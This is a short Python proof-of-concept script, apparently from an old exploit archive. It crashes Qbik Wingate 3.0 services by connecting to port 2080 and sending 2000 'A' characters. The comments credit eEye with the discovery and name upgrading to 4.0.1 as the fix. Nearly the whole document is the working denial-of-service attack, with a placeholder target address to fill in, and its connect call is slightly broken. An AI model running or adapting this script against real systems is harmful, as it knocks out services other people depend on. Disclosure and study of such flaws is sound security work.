
#!/usr/bin/python
#
# Qbik Wingate 3.0 DoS Proof of Concept Code.
# Vulnerability Discovered by eEye Digital Security
Team(http://www.eEye.com)
# Simple Script by Prizm(Prizm@Resentment.org)
# 
# By connecting to port 2080 on a system running Qbik Wingate 3.0 and
# sending 2000
# characters, all wingate services will crash.
# *Solution* Upgrade to 4.0.1, version is not vulnerable to this Denial of
# Service attack. 
#
# This *simple* little script will crash all wingate services.


import socket
import sys
from string import strip

host="xxx.xxx.xxx.xxx" # Replace x's with IP.
port=2080
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
  s.connect(host,port)
  print "connection succeeded."
except socket.error, e:
  print "connection failed, " + e.args

s.send("A" * 2000)

#end


